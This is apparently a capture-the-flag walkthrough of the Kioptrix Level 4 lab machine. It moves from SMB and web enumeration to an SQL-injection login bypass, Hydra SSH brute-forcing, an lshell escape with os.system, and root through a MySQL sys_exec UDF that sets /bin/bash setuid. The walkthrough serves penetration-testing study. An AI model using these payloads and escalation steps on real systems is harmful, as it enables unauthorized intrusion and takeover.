# Samba

139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)

 SMB version:Samba 3.0.28a          no public exploit

Enumeration

-------------------------------------------------
Enum4linux

  Enum4linux is a tool for enumerating  information from Windows and Samba systems. It attempts to offer similar  functionality to enum.exe formerly available from www.bindview.com.
It is written in Perl and is basically a wrapper around the Samba tools smbclient, rpclient, net, and nmblookup.
Key features:
• RID cycling (When RestrictAnonymous is set to 1 on Windows 2000)
• User listing (When RestrictAnonymous is set to 0 on Windows 2000)
• Listing of group membership information
• Share enumeration
• Detecting if the host is in a workgroup or a domain
• Identifying the remote operating system
• Password policy retrieval

-------------------------------------------------

>enum4linux 192.168.1.6

============================ 
|    Users on 192.168.1.6    |
 ============================ 
index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody	Name: nobody	Desc: (null)
index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert	Name: ,,,	Desc: (null)
index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root	Name: root	Desc: (null)
index: 0x4 RID: 0xbba acb: 0x00000010 Account: john	Name: ,,,	Desc: (null)
index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret	Name: loneferret,,,	Desc: (null)


Users found: nobody, robert, root, john and loneferret.

# Web server

-----------------------------------------------------
using Nikto
 
 Nikto is a popular Web server scanner that  tests Web servers for dangerous files/CGIs, outdated server software  and other issues. It also performs generic and server type specific  checks.
-------------------------------------------------------

>nikto -h 192.168.1.6

![image](https://user-images.githubusercontent.com/24206178/154683737-d600aba7-4791-44fb-8c09-384a202004ab.png)

Apache 2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.

PHP 5.2.4 -2 ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch

This version is vulnarable!!!

Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names.


the vulnerable target machine has the HTTP PUT method allowed us to upload malicious backdoors =>  No it hasn't

----------------------------------------------------

>curl --head 192.168.1.6

HTTP/1.1 200 OK
Date: Thu, 28 Nov 2019 12:15:03 GMT
Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
X-Powered-By: PHP/5.2.4-2ubuntu5.6
Content-Type: text/html

--------------------------------------------------
Using DIRB

DIRB is a Web Content Scanner. It looks  for existing (and/or hidden) Web Objects. It basically works by  launching a dictionary-based attack against a web server and analyzing  the response. DIRB main purpose is to help in professional web  application auditing.

The tool “Dirb” is in-built in Kali  Linux, therefore, Open the terminal and type following command to start  brute force directory attack.
-------------------------------------------------


dirb http://192.168.1.6


GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.6/ ----
+ http://192.168.1.6/cgi-bin/ (CODE:403|SIZE:326)                                                                                                                                                                 
==> DIRECTORY: http://192.168.1.6/images/                                                                                                                                                                         
+ http://192.168.1.6/index (CODE:200|SIZE:1255)                                                                                                                                                                   
+ http://192.168.1.6/index.php (CODE:200|SIZE:1255)                                                                                                                                                               
==> DIRECTORY: http://192.168.1.6/john/                                                                                                                                                                           
+ http://192.168.1.6/logout (CODE:302|SIZE:0)                                                                                                                                                                     
+ http://192.168.1.6/member (CODE:302|SIZE:220)                                                                                                                                                                   
+ http://192.168.1.6/server-status (CODE:403|SIZE:331)     


Intersting Directores found: http://192.168.1.6/john/ 

-------------------------------------

Using Metasploit

-------------------------------------

>use auxiliary/scanner/http/dir_scanner

![image](https://user-images.githubusercontent.com/24206178/154683855-def63afd-8c57-4256-8997-c8adce6f566b.png)

Same result

----------------------------------------------------------

SQL injection

  SQL injection is a technique where a malicious user can inject SQL Commands into an SQL statement via a web page.
  An attacker could bypass  authentication, access, modify and delete data within a database. In  some cases, SQL Injection can even be used to execute commands on the  operating system, potentially allowing an attacker to escalate to more  damaging attacks inside of a network that sits behind a firewall.
  
 ---------------------------------------------------------
 
 username: robert
 password:' or 1=1 -- -

![image](https://user-images.githubusercontent.com/24206178/154683911-96f7e105-26d1-4b0c-bcfc-60bca2642bab.png)

username: john
 password:' or 1=1 -- -
 
 ![image](https://user-images.githubusercontent.com/24206178/154683937-dbe39ba5-a6d3-4bb5-aaeb-d6369fbe362f.png)


Now we have usrnames from SMB

and we have passwords from the web server

Lets go to the ssh

# SSH

we found some usernames using enum4linux

now lets use it to brutfourcing

Users found: robert, root, john and loneferret.

------------------------------------------------
Hydra

Hydra is a parallelized login cracker  which supports numerous protocols to attack. It is very fast and  flexible, and new modules are easy to add. This tool makes it possible  for researchers and security consultants to show how easy it would be to  gain unauthorized access to a system remotely.
It supports: Cisco AAA, Cisco auth,  Cisco enable, CVS, FTP, HTTP(S)-FORM-GET, HTTP(S)-FORM-POST,  HTTP(S)-GET, HTTP(S)-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL,  MySQL, NNTP, Oracle Listener, Oracle SID, PC-Anywhere, PC-NFS, POP3,  PostgreSQL, RDP, Rexec, Rlogin, Rsh, SIP, SMB(NT), SMTP, SMTP Enum, SNMP  v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2),  Telnet, VMware-Auth, VNC and XMPP.

------------------------------------------------

hydra -e nsr -l robert -P Desktop/Passwords/xato-net-10-million-passwords-10000.txt 192.168.1.6 ssh -t 4
hydra -e nsr -l root -P Desktop/Passwords/xato-net-10-million-passwords-10000.txt 192.168.1.6 ssh -t 4
hydra -e nsr -l john -P Desktop/Passwords/xato-net-10-million-passwords-10000.txt 192.168.1.6 ssh -t 4
hydra -e nsr -l loneferret -P Desktop/Passwords/xato-net-10-million-passwords-10000.txt 192.168.1.6 ssh -t 4


hydra won’t find any passwords

-----------------------------------------------

# Escaping restricted (s)hell

>ssh john@192.168.1.6
john@192.168.1.6's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands



>john:~$ ls -al
total 28
drwxr-xr-x 2 john john 4096 2012-02-04 18:39 .
drwxr-xr-x 5 root root 4096 2012-02-04 18:05 ..
-rw------- 1 john john   61 2012-02-04 23:31 .bash_history
-rw-r--r-- 1 john john  220 2012-02-04 18:04 .bash_logout
-rw-r--r-- 1 john john 2940 2012-02-04 18:04 .bashrc
-rw-r--r-- 1 john john  287 2019-11-28 11:59 .lhistory
-rw-r--r-- 1 john john  586 2012-02-04 18:04 .profile


>john:~$ which python
*** unknown command: which

>john:~$ locate python
*** unknown command: locate

>john:~$ cd asdf
lshell: asdf: No such file or directory

lshell...this is intertsting

john:~$ echo os.system('/bin/bash')

# Root

john@Kioptrix4:~$

john@Kioptrix4:/var/www$ cat checklogin.php 

<?php

ob_start();

$host="localhost"; // Host name

$username="root"; // Mysql username

$password=""; // Mysql password

$db_name="members"; // Database name

$tbl_name="members"; // Table name

--------------------------------------------------

mysql> show databases;      
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)


mysql> use members          

Reading table information for completion of table and column names

You can turn off this feature to get a quicker startup with -A

Database changed


mysql> show tables;   
+-------------------+
| Tables_in_members |
+-------------------+
| members           | 
+-------------------+
1 row in set (0.00 sec)



mysql> select * from members;                      
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
|  1 | john     | MyNameIsJohn          | 
|  2 | robert   | ADGAdsafdfwt4gadfga== | 
+----+----------+-----------------------+

2 rows in set (0.00 sec)

No new information

---------------------------------------------------------------


mysql> use mysql;

Reading table information for completion of table and column names

You can turn off this feature to get a quicker startup with -A

Database changed

mysql> create table root(line blob);

Query OK, 0 rows affected (0.17 sec)

mysql> insert into root values(load_file('/home/npn/lib_mysqludf_sys.so'));

Query OK, 1 row affected (0.12 sec)


mysql>create function sys_exec returns integer soname 'lib_mysqludf_sys.so';

mysql> select sys_exec('chmod u+s /bin/bash');

john@Kioptrix4:~$ ls -a /bin/bash
/bin/bash

john@Kioptrix4:~$ ls -l /bin/bash

-rwsr-xr-x 1 root root 702160 2008-05-12 14:33 /bin/bash

john@Kioptrix4:~$ bash -p

bash-3.2# whoami
root

bash-3.2# cd /root

bash-3.2# ls

congrats.txt  lshell-0.9.12

bash-3.2# cat congrats.txt 

Congratulations!

You've got root.

There is more then one way to get root on this system. Try and find them.

I've only tested two (2) methods, but it doesn't mean there aren't more.

As always there's an easy way, and a not so easy way to pop this box.

Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and

also work and family life are my priorities. Hobbies are low on my list.

Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:

www.kioptrix.com

Thanks for playing,

loneferret
